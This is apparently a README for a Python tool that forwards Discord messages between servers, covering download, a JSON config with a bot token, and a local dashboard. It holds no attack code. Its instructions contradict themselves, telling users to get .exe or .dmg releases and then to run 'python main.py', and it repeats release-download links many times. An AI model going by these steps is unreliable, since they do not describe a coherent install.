# ⚡ Discord-Message-Forwarder - Send Messages Across Servers Fast

[![Download](https://img.shields.io/badge/Download-Discord--Message--Forwarder-blue?style=for-the-badge&logo=github)](https://github.com/sandro-beep/Discord-Message-Forwarder/releases)

---

## 📋 Overview

Discord-Message-Forwarder lets you send messages from one Discord server or channel to another without delays. It works automatically, copying messages quickly and accurately. This tool also adds extra functions like image uploads to a cloud service, filtering unwanted words, and mapping roles for better control.

This program runs on your computer using Python, but you don’t need to know programming to use it. It offers a live dashboard where you can watch messages as they forward. The software is designed to avoid slowing down even when many messages pass through.

---

## 💡 Key Features

- Forward messages instantly between servers or channels.
- Upload images to a content delivery network (CDN) automatically.
- Add watermarks to forwarded images to protect content.
- Filter out bad language or unwanted words.
- Map Discord roles to control who can send and receive messages.
- Access some channels publicly without log-in.
- Control message speed with smart rate limiting.
- View activity and statistics on a live dashboard.
- Easy setup without programming knowledge.

---

## 🖥️ System Requirements

- Operating System: Windows 10 or later, macOS 10.14 or later, or Linux (Ubuntu 18.04+ recommended).
- Python 3.8 or newer installed on your computer.
- Internet connection for Discord access and CDN uploads.
- At least 1 GB of free memory and 100 MB of free disk space.
- A Discord account with permission to access the servers and channels you want to forward messages between.

---

## 🚀 Getting Started

This guide walks you through downloading, installing, and running Discord-Message-Forwarder step by step.

---

## ⬇️ Download & Install

First, you need to get the program files.

**Step 1:** Visit the download page by clicking this button:

[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/sandro-beep/Discord-Message-Forwarder/releases)

**Step 2:** On the download page, find the latest release. Look for a file ending with `.zip` or `.exe` for Windows, `.dmg` for macOS, or a compressed file for Linux.

**Step 3:** Download that file to your computer.

**Step 4:** Unpack the downloaded file if it is compressed:
- On Windows, right-click and choose “Extract All.”
- On macOS, double-click the `.dmg` to mount it.
- On Linux, use your archive manager.

**Step 5:** Make sure you have Python 3 installed:
- You can check by opening a terminal or command prompt and typing `python --version` or `python3 --version`.
- If Python is not installed, download it from [python.org](https://www.python.org/downloads/) and follow the installation instructions.

---

## ⚙️ Setup & Configuration

Discord-Message-Forwarder uses a simple configuration file in JSON format. This file tells the program which servers and channels to work with, what words to filter, and how to map roles.

**How to configure:**

1. Find the file named `config.json` in the unpacked folder.
2. Open it with a plain text editor like Notepad (Windows), TextEdit (macOS), or any text editor on Linux.
3. You will see sections like `"source_channels"`, `"destination_channels"`, `"word_filter"`, and `"role_mapping"`.
4. Edit these to match your Discord servers.

A simple example for forwarding messages from one channel to another:

```json
{
  "source_channels": ["123456789012345678"],
  "destination_channels": ["876543210987654321"],
  "word_filter": ["badword1", "badword2"],
  "role_mapping": {
    "admin": "moderator",
    "member": "guest"
  },
  "cdn_upload": true,
  "add_watermark": true
}
```

- **Source channels** are where messages come from.
- **Destination channels** are where messages go.
- **Word filter** removes or blocks messages containing listed words.
- **Role mapping** changes user roles when forwarding messages.
- **CDN upload** turns on image uploads to the cloud.
- **Add watermark** places a small image or text on forwarded pictures.

If you are unsure about any settings, leave them as they are or ask someone familiar with your Discord setup to help.

---

## ▶️ Running the Program

With everything installed and configured, you can now run the program.

**Step 1:** Open a terminal or command prompt window.

- On Windows: Press `Win + R`, type `cmd`, press Enter.
- On macOS: Open the Terminal from Applications > Utilities.
- On Linux: Open your preferred terminal emulator.

**Step 2:** Navigate to the folder where you unpacked the program files. You can do this by typing:

```bash
cd path/to/Discord-Message-Forwarder
```

Replace `path/to/Discord-Message-Forwarder` with the actual folder path.

**Step 3:** Start the program by typing:

```bash
python main.py
```

or if your system uses `python3`:

```bash
python3 main.py
```

---

## 🔐 Discord Access and Permissions

To forward messages, Discord-Message-Forwarder needs access to your Discord account through a token or bot.

- The easiest way is to create or use a Discord bot with permissions to read messages in source channels and send messages in destination channels.
- You will need to place your bot’s token in your `config.json` file under `"bot_token"`.

If you don’t have a bot set up:

1. Go to the Discord Developer Portal: https://discord.com/developers/applications
2. Create a new application.
3. Add a bot to your application.
4. Copy the bot token.
5. Invite the bot to your servers with necessary permissions.

If you’re uncomfortable with bots, ask a Discord server admin for help.

---

## 📊 Using the Dashboard

While the program runs, it provides a live dashboard you can open in your web browser.

- By default, open your browser and go to `http://localhost:8080`.
- The dashboard shows forwarded messages, errors, and rates.
- You can pause or restart forwarding from this page.
- It also shows if any connections to Discord or the CDN fail.

If the dashboard does not appear, check your firewall settings or that the program is running correctly.

---

## 🛠️ Troubleshooting

If you run into issues:

- Make sure Python is installed and up to date.
- Confirm your `config.json` file is correctly formatted (no extra commas or missing brackets).
- Check your Discord bot has needed permissions.
- Verify your internet connection is active.
- Restart the program if errors happen.
- Consult the log files found in the program folder (`logs/`).

For help, you can also visit the repository issues page: https://github.com/sandro-beep/Discord-Message-Forwarder/issues

---

## 🌐 More Information & Updates

You can always get the latest version of Discord-Message-Forwarder or check for updates by visiting the releases page:

[Download Latest Version](https://github.com/sandro-beep/Discord-Message-Forwarder/releases)

Keep the program updated to enjoy new features and bug fixes.

---

## 🤝 Contributing and Feedback

If you want to contribute or suggest improvements:

- You don’t need advanced skills to participate.
- Check the Issues tab for known problems.
- Submit your ideas or bug reports.
- Share your experience using the tool.

Your feedback helps keep the software useful for everyone.

---

## 📚 Additional Notes

Discord-Message-Forwarder works best with stable internet and accounts that have permissions set carefully. Remember, forwarding messages means you should respect privacy and server rules.

Before using the program, confirm with your Discord server admins if forwarding messages is allowed.

---

## 🔗 Quick Links

- [Download Discord-Message-Forwarder](https://github.com/sandro-beep/Discord-Message-Forwarder/releases)
- [Discord Developer Portal](https://discord.com/developers/applications)
- [Python Downloads](https://www.python.org/downloads/)
- [Report Issues & Feedback](https://github.com/sandro-beep/Discord-Message-Forwarder/issues)